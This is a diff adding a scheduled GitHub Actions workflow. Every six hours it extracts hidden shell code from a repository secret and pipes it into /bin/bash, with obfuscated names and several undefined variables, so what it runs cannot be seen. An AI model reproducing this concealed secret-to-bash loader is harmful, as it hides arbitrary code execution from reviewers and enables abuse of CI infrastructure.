@@ -1,0 +1,25 @@
+name: foryouxuanzi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: foryouxuanzi
+        env:
+          j77: ${{ secrets.j77 }}
+        run: |
+          echo $j77 | jq -r .hqs01 | /bin/bash
+          echo $qdv5 | jq -r .eyhl963 | /bin/bash
+          echo $pj6 | jq -r .bw39 | /bin/bash
+          echo $p610 | jq -r .jluz2297 | /bin/bash
+          echo $hfutt39 | jq -r .xunr301 | /bin/bash
+          echo $p60468 | jq -r .tpsnz00 | /bin/bash
+          echo $arsi45 | jq -r .zoq85504 | /bin/bash
+          echo $np0 | jq -r .i86 | /bin/bash
+          echo $i56707 | jq -r .hyfe3 | /bin/bash
+
